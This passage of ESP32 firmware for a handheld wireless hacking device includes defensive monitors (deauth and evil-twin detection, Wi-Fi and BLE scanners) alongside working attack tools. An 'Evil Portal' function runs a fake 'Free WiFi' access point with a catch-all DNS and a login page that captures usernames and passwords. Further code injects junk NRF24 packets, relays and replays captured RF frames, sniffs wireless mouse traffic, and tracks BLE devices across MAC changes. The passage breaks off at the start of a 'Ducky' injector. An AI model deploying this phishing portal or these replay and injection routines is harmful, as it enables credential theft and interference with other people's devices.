void wids_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *frame = pkt->payload;
  uint8_t subtype = frame[0] & 0xFC;
  if (subtype == 0x80) {
    beaconCount++;
    uint8_t *bssid = frame + 10;
    int8_t rssi = pkt->rx_ctrl.rssi;
    String ssid = "";
    int pos = 36;
    while (pos < pkt->rx_ctrl.sig_len - 2) {
      uint8_t id = frame[pos];
      uint8_t len = frame[pos + 1];
      if (id == 0 && len > 0 && len < 32) {
        char tmp[33];
        memcpy(tmp, &frame[pos + 2], len); tmp[len] = 0;
        ssid = String(tmp); break;
      }
      pos += len + 2;
    }
    bool found = false;
    for (int i = 0; i < knownAPCount; i++) {
      if (memcmp(knownAPs[i].bssid, bssid, 6) == 0) {
        knownAPs[i].rssi = rssi; knownAPs[i].lastSeen = millis();
        found = true; break;
      }
    }
    if (!found && knownAPCount < MAX_APS) {
      memcpy(knownAPs[knownAPCount].bssid, bssid, 6);
      knownAPs[knownAPCount].ssid = ssid;
      knownAPs[knownAPCount].rssi = rssi;
      knownAPs[knownAPCount].lastSeen = millis();
      knownAPCount++;
    }
    for (int i = 0; i < knownAPCount; i++)
      for (int j = i + 1; j < knownAPCount; j++)
        if (knownAPs[i].ssid == knownAPs[j].ssid && knownAPs[i].ssid != "")
          if (memcmp(knownAPs[i].bssid, knownAPs[j].bssid, 6) != 0)
            if (abs(knownAPs[j].rssi - knownAPs[i].rssi) > 20) {
              evilTwinAlert = true;
              evilTwinSSID = knownAPs[i].ssid;
            }
  } else if (subtype == 0xC0) {
    deauthCnt++;
  }
}

void runWIDS() {
  stopRadios();
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wids_cb);
  beaconCount = 0; deauthCnt = 0; evilTwinAlert = false; knownAPCount = 0;
  unsigned long lastCheck = millis();
  displayInfo("WIDS Active", "SEL to stop");
  while (!selPressed()) {
    if (millis() - lastCheck >= 1000) {
      display.clearDisplay();
      drawHeader("WIDS");
      display.setCursor(0, 14); display.print("B:"); display.print(beaconCount);
      display.print(" D:"); display.print(deauthCnt);
      display.setCursor(0, 28);
      if (beaconCount > 50) display.print("FLOOD!");
      else if (evilTwinAlert) { display.print("EVIL:"); display.print(evilTwinSSID.substring(0, 12)); }
      else if (deauthCnt > 15) display.print("DEAUTH!");
      else display.print("Normal");
      display.display();
      beaconCount = 0; deauthCnt = 0; evilTwinAlert = false;
      lastCheck = millis();
    }
    yield();
  }
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

// ============================================================
// ROGUE AP DETECT
// ============================================================
void runRogueAPDetect() {
  stopRadios();
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  int sel = 0;
  int n = 0;
  unsigned long lastScan = 0;
  displayInfo("Rogue AP", "Scanning...", "SEL to stop");
  while (!selPressed()) {
    if (millis() - lastScan > 5000) {
      n = WiFi.scanNetworks();
      lastScan = millis();
    }
    display.clearDisplay();
    drawHeader("Rogue AP Scan");
    display.setCursor(0, 11); display.print("Found: "); display.print(n);
    for (int i = 0; i < 4 && (sel + i) < n; i++) {
      int idx = sel + i;
      String ssid = WiFi.SSID(idx);
      if (ssid == "") ssid = "<hidden>";
      display.setCursor(0, 22 + i * 10);
      display.print(ssid.substring(0, 12));
      display.setCursor(96, 22 + i * 10);
      display.print(WiFi.RSSI(idx));
    }
    display.display();
    if (upPressed() && n > 0) sel = (sel == 0) ? n - 4 : sel - 1;
    if (downPressed() && n > 4) sel = (sel + 1) % (n - 3);
    yield();
  }
  WiFi.scanDelete();
  recoverFromWiFi();
}

// ============================================================
// NRF24 INJECTOR
// ============================================================
void runNRF24Injector() {
  displayInfo("NRF24 Injector", "Init...");
  initRadios();
  const uint64_t pipes[] = {0xE7E7E7E7E7LL, 0xC2C2C2C2C2LL, 0xDEADBEEF01LL, 0x4142434445LL};
  uint8_t payload[32];
  memset(payload, 0xAA, sizeof(payload));
  unsigned long last = 0;
  displayInfo("NRF24 Injector", "Broadcasting...", "SEL to stop");
  while (!selPressed()) {
    if (millis() - last > 20) {
      if (radio1Active) {
        radio.setChannel(random(0, 100));
        radio.openWritingPipe(pipes[random(0, 4)]);
        radio.writeFast(payload, 32);
      }
      last = millis();
    }
    yield();
  }
  initRadios();
}

// ============================================================
// BLE SCANNER
// ============================================================
static BLEAdvertisedDevice* scannedDevices[20] = {nullptr};
static String bleNames[20], bleMacs[20];
static int bleRSSI[20], scanCount = 0;

class ScanCallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) {
    if (scanCount >= 20) return;
    scannedDevices[scanCount] = new BLEAdvertisedDevice(dev);
    bleNames[scanCount] = dev.haveName() ? dev.getName().c_str() : "Unknown";
    bleMacs[scanCount] = dev.getAddress().toString().c_str();
    bleRSSI[scanCount] = dev.getRSSI();
    scanCount++;
  }
};

void runBLEScanner() {
  stopRadios();
  WiFi.mode(WIFI_OFF);
  BLEDevice::init("");
  BLEScan* pScan = BLEDevice::getScan();
  scanCount = 0;
  pScan->setAdvertisedDeviceCallbacks(new ScanCallbacks());
  pScan->setActiveScan(true);
  pScan->setInterval(100); pScan->setWindow(99);
  displayInfo("BLE Scanner", "Scanning...");
  pScan->start(5, false);
  int sel = 0;
  while (!selPressed()) {
    display.clearDisplay();
    drawHeader("BLE Scanner");
    if (scanCount == 0) {
      display.setCursor(0, 20); display.println("No devices");
    } else {
      int idx = sel % scanCount;
      display.setCursor(0, 14); display.print(idx + 1); display.print("/"); display.print(scanCount);
      display.setCursor(0, 26); display.println(bleNames[idx].substring(0, 20));
      display.setCursor(0, 38); display.println(bleMacs[idx]);
      display.setCursor(0, 50); display.print(bleRSSI[idx]); display.println(" dBm");
    }
    display.display();
    if (upPressed() && scanCount > 0) sel = (sel == 0) ? scanCount - 1 : sel - 1;
    if (downPressed() && scanCount > 0) sel = (sel + 1) % scanCount;
    yield();
  }
  for (int i = 0; i < scanCount; i++) delete scannedDevices[i];
  scanCount = 0;
  BLEDevice::deinit(true);
  initRadios();
}

// ============================================================
// BLE GATT EXPLORER
// ============================================================
void runBLEGATTExplorer() {
  stopRadios();
  WiFi.mode(WIFI_OFF);
  BLEDevice::init("");
  BLEScan* pScan = BLEDevice::getScan();
  scanCount = 0;
  pScan->setAdvertisedDeviceCallbacks(new ScanCallbacks());
  pScan->setActiveScan(true);
  displayInfo("BLE GATT", "Scanning...");
  pScan->start(5, false);
  if (scanCount == 0) {
    displayInfo("No BLE device", "SEL to return");
    while (!selPressed()) yield();
    BLEDevice::deinit(true);
    initRadios(); return;
  }
  BLEAdvertisedDevice* dev = scannedDevices[0];
  displayInfo("Connecting", dev->getName().c_str());
  BLEClient* pClient = BLEDevice::createClient();
  if (pClient->connect(dev)) {
    displayInfo("Connected", "Services");
    std::map<std::string, BLERemoteService*>* services = pClient->getServices();
    int idx = 0;
    int svcCount = services->size();
    while (!selPressed()) {
      display.clearDisplay();
      drawHeader("GATT Services");
      int y = 12, count = 0;
      for (auto& svc : *services) {
        if (count == idx) { display.fillRect(0, y - 1, 128, 10, SSD1306_WHITE); display.setTextColor(SSD1306_BLACK); }
        else display.setTextColor(SSD1306_WHITE);
        display.setCursor(2, y); display.print(String(svc.first.c_str()).substring(0, 20));
        y += 10;
        if (++count > 4) break;
      }
      display.display();
      if (upPressed()) idx = max(0, idx - 1);
      if (downPressed()) idx = min(svcCount - 1, idx + 1);
      yield();
    }
    pClient->disconnect();
  } else {
    displayInfo("Connect failed", "SEL to return");
    while (!selPressed()) yield();
  }
  BLEDevice::deinit(true);
  initRadios();
}

// ============================================================
// BLE TRACKER
// ============================================================
struct DevFingerprint { String name; int companyId; unsigned long lastSeen; String lastMac; };
std::vector<DevFingerprint> fingerprints;

class TrackerCallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) {
    String name = dev.haveName() ? dev.getName() : "";
    String mdata = dev.haveManufacturerData() ? dev.getManufacturerData() : "";
    int companyId = -1;
    if (mdata.length() >= 2) companyId = (uint8_t)mdata[0] | ((uint8_t)mdata[1] << 8);
    for (auto& fp : fingerprints) {
      if (fp.companyId == companyId && fp.name == name) {
        fp.lastSeen = millis();
        fp.lastMac = dev.getAddress().toString().c_str();
        return;
      }
    }
    DevFingerprint nf;
    nf.name = name; nf.companyId = companyId;
    nf.lastSeen = millis();
    nf.lastMac = dev.getAddress().toString().c_str();
    fingerprints.push_back(nf);
  }
};

void runBLETracker() {
  stopRadios();
  WiFi.mode(WIFI_OFF);
  BLEDevice::init("");
  BLEScan* pScan = BLEDevice::getScan();
  pScan->setAdvertisedDeviceCallbacks(new TrackerCallbacks());
  pScan->setActiveScan(true);
  pScan->setInterval(100); pScan->setWindow(99);
  fingerprints.clear();
  displayInfo("BLE Tracker", "Scanning...");
  pScan->start(0, nullptr, false);
  while (!selPressed()) {
    display.clearDisplay();
    drawHeader("BLE Tracker");
    display.setCursor(0, 12); display.print("Devices: "); display.print(fingerprints.size());
    int y = 24;
    for (int i = 0; i < min(3, (int)fingerprints.size()); i++) {
      String info = fingerprints[i].name + " [" + String(fingerprints[i].companyId, HEX) + "]";
      display.setCursor(0, y); display.print(info.substring(0, 22));
      y += 10;
    }
    display.display();
    safeDelay(1000);
    yield();
  }
  pScan->stop();
  BLEDevice::deinit(true);
  initRadios();
}

// ============================================================
// WIFI ANALYZER
// ============================================================
// WIFI ANALYZER & TRAFFIC INSPECTION SUITE
// ============================================================

void runWiFiAnalyzer() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  displayInfo("WiFi Analyzer", "Scanning 2.4G...", "Please wait");
  int n = WiFi.scanNetworks();

  if (n == 0) {
    displayInfo("No networks", "found nearby", "Hold SEL 5s: Exit");
    while (!checkGameExit()) yield();
    recoverFromWiFi();
    currentState = STATE_MENU;
    return;
  }

  int chOccupancy[14] = {0};
  int bestRSSI[14];
  for (int i = 0; i < 14; i++) bestRSSI[i] = -120;

  for (int i = 0; i < n; i++) {
    int ch = WiFi.channel(i);
    if (ch >= 1 && ch <= 13) {
      chOccupancy[ch]++;
      if (WiFi.RSSI(i) > bestRSSI[ch]) bestRSSI[ch] = WiFi.RSSI(i);
    }
  }

  int bestRecCh = 1;
  int minScore = chOccupancy[1] * 2 + chOccupancy[2] + chOccupancy[3];
  int score6 = chOccupancy[6] * 2 + chOccupancy[4] + chOccupancy[5] + chOccupancy[7] + chOccupancy[8];
  int score11 = chOccupancy[11] * 2 + chOccupancy[9] + chOccupancy[10] + chOccupancy[12] + chOccupancy[13];

  if (score6 < minScore) { minScore = score6; bestRecCh = 6; }
  if (score11 < minScore) { minScore = score11; bestRecCh = 11; }

  int viewMode = 0;
  int selectedAP = 0;

  while (true) {
    if (checkGameExit()) {
      WiFi.scanDelete();
      recoverFromWiFi();
      currentState = STATE_MENU;
      return;
    }

    if (upPressed()) {
      if (viewMode == 1) selectedAP = (selectedAP == 0) ? n - 1 : selectedAP - 1;
      else selectedAP = (selectedAP == 0) ? 12 : selectedAP - 1;
    }
    if (downPressed()) {
      if (viewMode == 1) selectedAP = (selectedAP + 1) % n;
      else selectedAP = (selectedAP + 1) % 13;
    }
    if (selPressed()) {
      viewMode = (viewMode == 0) ? 1 : 0;
    }

    display.clearDisplay();

    if (viewMode == 0) {
      drawHeader("Channel Overlap");
      display.setCursor(0, 10);
      display.print("APs:"); display.print(n);
      display.setCursor(50, 10);
      display.print("*BEST:CH "); display.print(bestRecCh);

      display.drawFastHLine(4, 52, 120, SSD1306_WHITE);

      for (int i = 0; i < n; i++) {
        int ch = WiFi.channel(i);
        if (ch < 1 || ch > 13) continue;
        int centerX = map(ch, 1, 13, 12, 116);
        int peakH = map(constrain(WiFi.RSSI(i), -95, -30), -95, -30, 8, 36);

        for (int dx = -14; dx <= 14; dx++) {
          int px = centerX + dx;
          if (px >= 4 && px <= 124) {
            float norm = (float)dx / 14.0;
            int curveY = 52 - (int)(peakH * (1.0 - norm * norm));
            display.drawPixel(px, curveY, SSD1306_WHITE);
          }
        }
      }

      display.setCursor(10, 55); display.print("1");
      display.setCursor(62, 55); display.print("6");
      display.setCursor(112, 55); display.print("11");

    } else {
      drawHeader("WiFi AP Inspector");
      display.setCursor(0, 11);
      display.print("["); display.print(selectedAP + 1); display.print("/"); display.print(n); display.print("] ");
      display.print(WiFi.SSID(selectedAP).substring(0, 13));

      display.setCursor(0, 23);
      display.print("CH:"); display.print(WiFi.channel(selectedAP));
      display.print(" ("); display.print(2412 + (WiFi.channel(selectedAP) - 1) * 5); display.print("MHz)");

      display.setCursor(0, 34);
      display.print("RSSI: "); display.print(WiFi.RSSI(selectedAP)); display.print(" dBm");

      int sigW = map(constrain(WiFi.RSSI(selectedAP), -95, -30), -95, -30, 0, 40);
      display.drawRect(78, 34, 44, 7, SSD1306_WHITE);
      display.fillRect(80, 36, sigW, 3, SSD1306_WHITE);

      display.setCursor(0, 45);
      display.print("SEC: ");
      wifi_auth_mode_t auth = WiFi.encryptionType(selectedAP);
      if (auth == WIFI_AUTH_OPEN) display.print("OPEN");
      else if (auth == WIFI_AUTH_WPA2_PSK) display.print("WPA2-PSK");
      else if (auth == WIFI_AUTH_WPA3_PSK) display.print("WPA3-SAE");
      else display.print("WPA/WEP");

      display.setCursor(0, 56);
      display.print("BSSID:"); display.print(WiFi.BSSIDstr(selectedAP).substring(0, 14));
    }

    drawExitProgress();
    display.display();
    safeDelay(25);
  }
}

// ============================================================
// WIFI SNIFFER / PACKET COUNTER / SIGNAL METER PRO
// ============================================================

volatile uint32_t g_pktTotal = 0;
volatile uint32_t g_pktMgmt = 0;
volatile uint32_t g_pktData = 0;
volatile uint32_t g_pktCtrl = 0;
volatile uint32_t g_pktDeauth = 0;
volatile int8_t   g_lastPktRSSI = -100;
volatile uint8_t  g_lastSrcMac[6] = {0};
volatile uint8_t  g_lastFrameType = 0;

void proPktCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  g_pktTotal++;
  g_lastPktRSSI = pkt->rx_ctrl.rssi;

  uint8_t fc0 = pkt->payload[0];
  uint8_t fType = (fc0 >> 2) & 0x03;
  g_lastFrameType = fType;

  if (fType == 0) {
    g_pktMgmt++;
    if (fc0 == 0xC0 || fc0 == 0xA0) g_pktDeauth++;
  } else if (fType == 1) {
    g_pktCtrl++;
  } else if (fType == 2) {
    g_pktData++;
  }

  if (pkt->rx_ctrl.sig_len >= 16) {
    for (int k = 0; k < 6; k++) g_lastSrcMac[k] = pkt->payload[10 + k];
  }
}

void runPacketCounter() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&proPktCallback);

  int curChan = 1;
  esp_wifi_set_channel(curChan, WIFI_SECOND_CHAN_NONE);

  g_pktTotal = 0; g_pktMgmt = 0; g_pktData = 0; g_pktCtrl = 0; g_pktDeauth = 0;
  uint32_t prevTotal = 0;
  uint32_t pps = 0;
  uint32_t peakPPS = 0;
  uint8_t ppsHistory[30] = {0};
  unsigned long lastCalc = millis();

  displayInfo("Traffic Analyzer", "Deep Packet Insp.", "Hold SEL 5s: Exit");
  safeDelay(1200);

  while (true) {
    if (checkGameExit()) {
      esp_wifi_set_promiscuous_rx_cb(NULL);
      esp_wifi_set_promiscuous(false);
      recoverFromWiFi();
      currentState = STATE_MENU;
      return;
    }

    if (upPressed()) {
      curChan = (curChan % 13) + 1;
      esp_wifi_set_channel(curChan, WIFI_SECOND_CHAN_NONE);
    }
    if (downPressed()) {
      curChan = (curChan == 1) ? 13 : curChan - 1;
      esp_wifi_set_channel(curChan, WIFI_SECOND_CHAN_NONE);
    }
    if (selPressed()) {
      g_pktTotal = 0; g_pktMgmt = 0; g_pktData = 0; g_pktCtrl = 0; g_pktDeauth = 0;
      pps = 0; peakPPS = 0;
      for (int i = 0; i < 30; i++) ppsHistory[i] = 0;
    }

    if (millis() - lastCalc >= 1000) {
      lastCalc = millis();
      pps = g_pktTotal - prevTotal;
      prevTotal = g_pktTotal;
      if (pps > peakPPS) peakPPS = pps;

      for (int i = 29; i > 0; i--) ppsHistory[i] = ppsHistory[i - 1];
      ppsHistory[0] = constrain(pps / 10, 0, 16);
    }

    display.clearDisplay();
    drawHeader("Traffic Analyzer");

    display.setCursor(0, 11);
    display.print("CH:"); display.print(curChan);
    display.setCursor(35, 11);
    display.print("PPS:"); display.print(pps);
    display.setCursor(85, 11);
    display.print("PK:"); display.print(peakPPS);

    if (g_pktDeauth > 0) {
      display.fillRect(0, 20, 128, 9, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.setCursor(2, 21);
      display.print("[!] DEAUTH ATTACK: "); display.print(g_pktDeauth);
      display.setTextColor(SSD1306_WHITE);
    } else {
      display.setCursor(0, 21);
      display.print("Total Pkts: "); display.print(g_pktTotal);
    }

    uint32_t total = g_pktTotal ? g_pktTotal : 1;
    int mgmtPct = (g_pktMgmt * 100) / total;
    int dataPct = (g_pktData * 100) / total;
    int ctrlPct = (g_pktCtrl * 100) / total;

    display.setCursor(0, 32); display.print("MGMT:"); display.print(mgmtPct); display.print("%");
    display.drawRect(55, 33, 70, 5, SSD1306_WHITE);
    display.fillRect(55, 33, map(mgmtPct, 0, 100, 0, 70), 5, SSD1306_WHITE);

    display.setCursor(0, 40); display.print("DATA:"); display.print(dataPct); display.print("%");
    display.drawRect(55, 41, 70, 5, SSD1306_WHITE);
    display.fillRect(55, 41, map(dataPct, 0, 100, 0, 70), 5, SSD1306_WHITE);

    display.setCursor(0, 48); display.print("CTRL:"); display.print(ctrlPct); display.print("%");
    display.drawRect(55, 49, 70, 5, SSD1306_WHITE);
    display.fillRect(55, 49, map(ctrlPct, 0, 100, 0, 70), 5, SSD1306_WHITE);

    for (int i = 0; i < 30; i++) {
      int h = ppsHistory[i];
      display.drawFastVLine(126 - i * 2, 63 - h, h, SSD1306_WHITE);
    }

    drawExitProgress();
    display.display();
    safeDelay(25);
  }
}

void runWiFiSniffer() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&proPktCallback);

  int ch = 1;
  bool autoHop = true;
  bool paused = false;
  unsigned long lastHop = millis();

  char snifferLogs[4][28];
  for (int i = 0; i < 4; i++) strcpy(snifferLogs[i], "Waiting for frames...");
  uint32_t lastSeenTotal = 0;

  displayInfo("Device Sniffer", "Live MAC & Traffic", "Hold SEL 5s: Exit");
  safeDelay(1200);

  while (true) {
    if (checkGameExit()) {
      esp_wifi_set_promiscuous_rx_cb(NULL);
      esp_wifi_set_promiscuous(false);
      recoverFromWiFi();
      currentState = STATE_MENU;
      return;
    }

    if (upPressed()) {
      autoHop = false;
      ch = (ch % 13) + 1;
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    }
    if (downPressed()) {
      autoHop = true;
    }
    if (selPressed()) {
      paused = !paused;
    }

    if (autoHop && !paused && millis() - lastHop > 250) {
      ch = (ch % 13) + 1;
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      lastHop = millis();
    }

    if (!paused && g_pktTotal != lastSeenTotal) {
      lastSeenTotal = g_pktTotal;
      for (int i = 3; i > 0; i--) strcpy(snifferLogs[i], snifferLogs[i - 1]);

      char typeChar = (g_lastFrameType == 0 ? 'M' : (g_lastFrameType == 2 ? 'D' : 'C'));
      snprintf(snifferLogs[0], sizeof(snifferLogs[0]), "[%c] %02X:%02X:%02X:%02X %ddB",
               typeChar, g_lastSrcMac[0], g_lastSrcMac[1], g_lastSrcMac[2], g_lastSrcMac[3], g_lastPktRSSI);
    }

    display.clearDisplay();
    drawHeader("WiFi Live Sniffer");

    display.setCursor(0, 11);
    display.print("CH:"); display.print(ch);
    display.print(autoHop ? " [HOP]" : " [LOCK]");
    display.setCursor(80, 11);
    if (paused) display.print("[PAUSE]");
    else { display.print("Pk:"); display.print(g_pktTotal); }

    for (int i = 0; i < 4; i++) {
      display.setCursor(0, 22 + i * 10);
      display.print(snifferLogs[i]);
    }

    drawExitProgress();
    display.display();
    safeDelay(25);
  }
}

void runSignalMeter() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  displayInfo("Signal Radar", "Scanning targets...", "Please wait");
  int n = WiFi.scanNetworks();

  if (n == 0) {
    displayInfo("No networks", "found", "Hold SEL 5s: Exit");
    while (!checkGameExit()) yield();
    recoverFromWiFi();
    currentState = STATE_MENU;
    return;
  }

  int targetIdx = 0;
  String targetSSID = WiFi.SSID(0);
  int curRSSI = WiFi.RSSI(0);

  int8_t rssiHistory[45];
  for (int i = 0; i < 45; i++) rssiHistory[i] = curRSSI;

  unsigned long lastBeep = millis();

  while (true) {
    if (checkGameExit()) {
      WiFi.scanDelete();
      recoverFromWiFi();
      currentState = STATE_MENU;
      return;
    }

    if (upPressed()) {
      targetIdx = (targetIdx == 0) ? n - 1 : targetIdx - 1;
      targetSSID = WiFi.SSID(targetIdx);
      curRSSI = WiFi.RSSI(targetIdx);
    }
    if (downPressed()) {
      targetIdx = (targetIdx + 1) % n;
      targetSSID = WiFi.SSID(targetIdx);
      curRSSI = WiFi.RSSI(targetIdx);
    }

    curRSSI = WiFi.RSSI(targetIdx);

    for (int i = 44; i > 0; i--) rssiHistory[i] = rssiHistory[i - 1];
    rssiHistory[0] = curRSSI;

    int beepInterval = map(constrain(curRSSI, -90, -30), -90, -30, 800, 80);
    if (millis() - lastBeep > beepInterval) {
      lastBeep = millis();
      if (!stealthMode) {
        digitalWrite(LED_PIN, HIGH);
        delayMicroseconds(500);
        digitalWrite(LED_PIN, LOW);
      }
    }

    float expVal = (-40.0 - curRSSI) / 24.0;
    float estDist = pow(10.0, expVal);
    if (estDist > 99.0) estDist = 99.0;
    if (estDist < 0.2) estDist = 0.2;

    display.clearDisplay();
    drawHeader("Signal Direction");

    display.setCursor(0, 11);
    display.print("Target: "); display.print(targetSSID.substring(0, 11));

    display.setCursor(0, 21);
    display.print(curRSSI); display.print(" dBm");
    display.setCursor(65, 21);
    display.print("~"); display.print(estDist, 1); display.print("m away");

    int gaugeCenterX = 24, gaugeCenterY = 58;
    int gaugeRadius = 22;
    display.drawCircle(gaugeCenterX, gaugeCenterY, gaugeRadius, SSD1306_WHITE);
    float angleRad = map(constrain(curRSSI, -95, -30), -95, -30, 210, 330) * 0.01745;
    int needleX = gaugeCenterX + cos(angleRad) * (gaugeRadius - 3);
    int needleY = gaugeCenterY + sin(angleRad) * (gaugeRadius - 3);
    display.drawLine(gaugeCenterX, gaugeCenterY, needleX, needleY, SSD1306_WHITE);

    display.drawRect(55, 34, 72, 28, SSD1306_WHITE);
    for (int i = 0; i < 44; i++) {
      int y1 = 60 - map(constrain(rssiHistory[i], -95, -30), -95, -30, 0, 24);
      int y2 = 60 - map(constrain(rssiHistory[i + 1], -95, -30), -95, -30, 0, 24);
      int x1 = 125 - i * (70 / 45.0);
      int x2 = 125 - (i + 1) * (70 / 45.0);
      display.drawLine(x1, y1, x2, y2, SSD1306_WHITE);
    }

    drawExitProgress();
    display.display();
    safeDelay(30);
  }
}

// ============================================================
// EVIL PORTAL
// ============================================================
const char loginPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><title>Free WiFi</title>
<style>body{font-family:Arial;text-align:center;margin-top:50px;}</style></head>
<body><h1>Free WiFi Login</h1>
<form action='/login' method='POST'>
<input name='user' placeholder='Username' style='padding:8px;margin:4px;'><br>
<input name='pass' type='password' placeholder='Password' style='padding:8px;margin:4px;'><br>
<input type='submit' value='Connect' style='padding:8px 24px;'>
</form></body></html>)rawliteral";

void runEvilPortal() {
  stopRadios();
  WiFi.mode(WIFI_AP);
  WiFi.softAP("Free WiFi");
  dnsServer.start(53, "*", WiFi.softAPIP());
  webServer.begin();
  capturedCredentials = "";
  displayInfo("Evil Portal", "AP: Free WiFi", "Waiting...");
  while (!selPressed()) {
    dnsServer.processNextRequest();
    WiFiClient client = webServer.available();
    if (client) {
      String request = client.readStringUntil('\r');
      client.flush();
      if (request.indexOf("POST /login") != -1) {
        String body = client.readString();
        int uIdx = body.indexOf("user=");
        int pIdx = body.indexOf("pass=");
        if (uIdx != -1 && pIdx != -1) {
          String user = body.substring(uIdx + 5, body.indexOf('&', uIdx));
          String pass = body.substring(pIdx + 5);
          pass.replace("+", " ");
          capturedCredentials = "U:" + user + " P:" + pass;
        }
        client.println("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n<h1>Connected!</h1>");
      } else {
        client.print("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n");
        client.print(FPSTR(loginPage));
      }
      client.stop();
      if (capturedCredentials != "") displayInfo("Captured!", capturedCredentials, "SEL to exit");
    }
    yield();
  }
  dnsServer.stop();
  webServer.stop();
  WiFi.softAPdisconnect(true);
  recoverFromWiFi();
}

// ============================================================
// RF REPEATER / REPLAY / MOUSE SNIFFER / OSCILLOSCOPE
// ============================================================
void runRFRepeater() {
  stopRadios();
  if (radio1Active) {
    radio.setAutoAck(false);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.setAddressWidth(5);
    radio.openReadingPipe(0, 0xE7E7E7E7E7LL);
    radio.startListening();
  }
  if (radio2Active) {
    radio2.setAutoAck(false);
    radio2.setDataRate(RF24_2MBPS);
    radio2.setCRCLength(RF24_CRC_DISABLED);
    radio2.setAddressWidth(5);
    radio2.openWritingPipe(0xE7E7E7E7E7LL);
    radio2.stopListening();
  }
  displayInfo("RF Repeater", "Relay active", "SEL to stop");
  uint8_t buf[32];
  while (!selPressed()) {
    if (radio1Active && radio.available()) {
      uint8_t len = radio.getDynamicPayloadSize();
      if (len > 32) len = 32;
      radio.read(&buf, len);
      if (radio2Active) radio2.writeFast(&buf, len);
    }
    yield();
  }
  initRadios();
}

void runRFReplay() {
  stopRadios();
  if (radio2Active) {
    radio2.setAutoAck(false);
    radio2.setDataRate(RF24_1MBPS);
    radio2.setCRCLength(RF24_CRC_DISABLED);
    radio2.setAddressWidth(5);
    radio2.openReadingPipe(1, 0xE7E7E7E7E7LL);
    radio2.startListening();
  }
  uint8_t buffer[10][32];
  uint8_t lens[10];
  int count = 0;
  displayInfo("RF Replay", "Capturing...", "SEL to stop");
  while (!selPressed() && count < 10) {
    if (radio2Active && radio2.available()) {
      uint8_t len = radio2.getDynamicPayloadSize();
      if (len > 32) len = 32;
      radio2.read(buffer[count], len);
      lens[count] = len;
      count++;
      display.clearDisplay();
      drawHeader("RF Replay");
      display.setCursor(0, 16); display.print("Captured: "); display.print(count); display.print("/10");
      display.display();
    }
    yield();
  }
  if (count > 0 && radio1Active) {
    radio.stopListening();
    displayInfo("Replaying", String(count) + " packets");
    for (int i = 0; i < count; i++) { radio.writeFast(buffer[i], lens[i]); safeDelay(200); }
    safeDelay(500);
  }
  initRadios();
}

void runMouseSniffer() {
  stopRadios();
  if (!radio1Active && !radio.begin(&spiBus)) return;
  radio1Active = true;
  radio.setAutoAck(false);
  radio.setDataRate(RF24_1MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.setAddressWidth(5);
  const uint64_t addrs[] = {0xE7E7E7E7E7LL, 0xC2C2C2C2C2LL, 0x0000000000LL};
  for (int i = 0; i < 3; i++) radio.openReadingPipe(i, addrs[i]);
  radio.startListening();
  displayInfo("Mouse Sniffer", "Listening...", "SEL to exit");
  uint8_t packet[32];
  int16_t mX = 64, mY = 32;
  while (!selPressed()) {
    if (radio.available()) {
      uint8_t len = radio.getDynamicPayloadSize();
      if (len > 32) len = 32;
      radio.read(&packet, len);
      if (len >= 4) {
        int8_t dx = packet[1], dy = packet[2];
        mX = constrain(mX + dx, 0, 127);
        mY = constrain(mY - dy, 0, 63);
      }
      display.clearDisplay();
      drawHeader("Mouse Sniff");
      display.drawRect(mX - 2, mY - 2, 5, 5, SSD1306_WHITE);
      display.drawPixel(mX, mY, SSD1306_WHITE);
      display.display();
    }
    yield();
  }
  radio.stopListening();
  initRadios();
}

void runRFOscilloscope() {
  stopRadios();
  if (!radio2Active && !radio2.begin(&spiBus)) return;
  radio2Active = true;
  radio2.setAutoAck(false);
  radio2.startListening();
  int channel = 45, timeScale = 1;
  const int w = 128;
  uint8_t wf[w];
  memset(wf, 0, w);
  int sampleIdx = 0;
  displayInfo("Oscilloscope", "Ch:" + String(channel), "SEL to exit");
  while (!selPressed()) {
    if (upPressed()) { channel = (channel + 1) % 126; radio2.setChannel(channel); }
    if (downPressed()) { timeScale = (timeScale % 3) + 1; }
    radio2.setChannel(channel);
    delayMicroseconds(timeScale * 100);
    int rpd = 0;
    for (int i = 0; i < 5; i++) { if (radio2.testRPD()) rpd++; delayMicroseconds(20); }
    wf[sampleIdx] = map(rpd, 0, 5, 0, 60);
    sampleIdx = (sampleIdx + 1) % w;
    display.clearDisplay();
    drawHeader("Oscilloscope");
    for (int x = 0; x < w - 1; x++) {
      int y1 = 62 - wf[(sampleIdx + x) % w];
      int y2 = 62 - wf[(sampleIdx + x + 1) % w];
      if (y1 > 63) y1 = 63; if (y2 > 63) y2 = 63;
      if (y1 < 10) y1 = 10; if (y2 < 10) y2 = 10;
      display.drawLine(x, y1, x + 1, y2, SSD1306_WHITE);
    }
    display.setCursor(100, 10); display.print(channel);
    display.display();
    yield();
  }
  radio2.stopListening();
  initRadios();
}

void runDuckyInjector() {
